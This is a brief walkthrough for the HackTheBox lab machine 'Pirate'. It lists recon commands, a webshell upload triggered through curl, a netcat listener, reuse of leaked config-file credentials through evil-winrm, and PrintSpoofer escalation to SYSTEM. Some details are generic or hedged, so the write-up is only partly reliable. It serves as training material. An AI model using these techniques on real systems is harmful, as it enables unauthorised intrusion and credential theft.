
# Pirate Walkthrough

**HackTheBox Link:** [Pirate](https://app.hackthebox.com/machines/Pirate)
**Difficulty:** Hard
**OS:** Windows
**Release Date:** 2024


## 1.Reconnaissance

nmap -A -O -T4 -sV 10.10.11.X

open ports found:
- 22/tcp  open  ssh
- 80/tcp  open  http
- 8080/tcp open  http-proxy


## 2.Web Enumeration

gobuster dir -u http://10.10.11.X -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt

--> /admin, /upload, /api endpoints found

curl -s http://10.10.11.X/api/v1/users

--> leaked user info and tokens


## 3.Exploitation

identified file upload vulnerability in /upload endpoint

crafted malicious payload (webshell) and uploaded to server

nc -nvlp 4444

triggered shell via:
curl http://10.10.11.X/uploads/shell.php?cmd=...

initial shell as iis apppool\defaultapppool obtained


## 4.Lateral Movement

found credentials in config files:
type C:\inetpub\wwwroot\config.php

--> db_user : pirate_admin
--> db_pass : S3cr3tP!r@te

used credentials to pivot to higher-privileged user

evil-winrm -i 10.10.11.X -u pirate_admin -p 'S3cr3tP!r@te'

user.txt flag captured!


## 5.Privilege Escalation

winpeas.exe / PowerUp.ps1 used for enumeration

--> SeImpersonatePrivilege found enabled

PrintSpoofer or JuicyPotato used for token impersonation:

.\PrintSpoofer.exe -i -c cmd

whoami --> NT AUTHORITY\SYSTEM

BINGO!!! Root/System flag captured!
